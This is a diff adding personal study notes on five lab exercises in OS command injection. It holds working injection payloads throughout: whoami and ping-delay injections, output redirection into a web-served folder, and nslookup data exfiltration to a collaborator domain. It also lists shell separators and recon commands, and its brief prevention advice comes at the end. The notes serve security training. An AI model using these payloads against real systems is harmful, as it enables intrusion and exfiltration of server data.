@@ -1,0 +1,62 @@
+01_OS_command_injection_simple_case
+- Find vuln path with 2 param -> Try execute shell code by add injection to param
+- Description:
++ This chal has 2 param productId, storeId
++ Like in lab description, we know that these param execute by shell code
++ So try to add '&whoami#' to injection the shell
+
+02_Blind_OS_command_injection_with_time_delays
+- Find api that could use shell code -> Try execute shell code by add injection to param
+- Description:
++ We know that command format look like:
+    mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
++ So in this case, we have a lots way to execute shell:
+    ";ping+-c+10+127.0.0.1;" in msg or subject (cuz these param may have quote, need to go out of it to execute shell)
+    "||ping+-c+10+127.0.0.1||"
+    ||ping+-c+10+127.0.0.1|| in mail (cond1 || cond2 || cond3, with this first cond1 would fail and cond2 execute)
++ It will delay server response by 10s
++ If it work, we can sure that server have this type of vuln
+
+03_Blind_OS_command_injection_with_output_redirection
+- Find api that could use shell code -> Try execute shell code by add injection to param-> Redirect info to file that can read in web UI like image folder
+- Description:
++ Just like previous chal, but we redirect output to file that we can see
++ Cuz we can see image through image folder, so it's only locate to exploit
++ So in this case, we use something like this
+    ||whoami > /var/www/images/out.txt|| in mail
++ Then we can see it in this path: '/image?filename=out.txt'
+
+Some useful command:
+- Linux: whoami, uname -a, ifconfig, netstat -an, ps -ef
+- Window: whoami, ver, ipconfig /all, netstat -an, tasklist
+
+
+-------------Both lab 4 and 5 require professional because of firewall, but lab 4 can random link just to solve it--------------------------
+
+04_Blind_OS_command_injection_with_out_of_band_interaction
+- Find api that could use shell code -> Try execute shell code by add injection to param -> Check the dns request to attacker domain
+- Description:
++ This payload "nslookup" to cause a DNS lookup for the specified domain
++ The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.
++ I don't have a burp suite professional, but just use a random link like that, you still can pass
++ ||nslookup abc123xyz.burpcollaborator.net||
++ But in real attack, better to host ur own domain and that can receive dns request(not only http)
+
+05_Blind_OS_command_injection_with_out_of_band_data_exfiltration
+- Find api that could use shell code -> Try execute shell code by add injection to param -> Check the dns request to attacker domain
+- Description:
++ This lab need burp collaborator to solve, because of firewall block other domain
++ ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
++ This ` char to perform inline execution of an injected command within the original command
+
+
+
+Ways of injecting OS commands:
+- Work in window and Unix-based systems: &, &&, |, ||
+- Work in Unix-based systems: ';', Newline (0x0a or \n),
++ perform inline execution: `, $()
+
+How to prevent OS command injection attacks:
+- Validating against a whitelist of permitted values.
+- Validating that the input is a number.
+- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
